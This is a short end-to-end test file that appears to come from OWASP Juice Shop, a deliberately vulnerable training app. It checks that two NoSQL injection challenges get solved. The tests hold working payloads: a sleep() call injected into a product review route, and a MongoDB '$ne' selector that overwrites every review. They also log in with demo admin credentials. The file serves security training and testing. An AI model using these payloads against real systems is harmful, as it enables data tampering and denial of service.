'use strict'

describe('/#/search', function () {
  beforeEach(function () {
    browser.get('/#/search')
  })

  describe('challenge "NoSql Command Injection"', function () {
    protractor.beforeEach.login({ email: 'admin@juice-sh.op', password: 'admin123' })

    it('should be possible to inject a command into the get route', function () {
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.get(\'/rest/product/sleep(1000)/reviews\');')
      browser.driver.sleep(5000)
      browser.ignoreSynchronization = false
    })
    protractor.expect.challengeSolved({ challenge: 'NoSql Command Injection' })
  })

  describe('challenge "NoSql Injection"', function () {
    it('should be possible to inject a selector into the update route', function () {
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.patch(\'/rest/product/reviews\', { "id": { "$ne": -1 }, "message": "injected" });')
      browser.driver.sleep(1000)
      browser.ignoreSynchronization = false
    })
    protractor.expect.challengeSolved({ challenge: 'NoSql Injection' })
  })
})
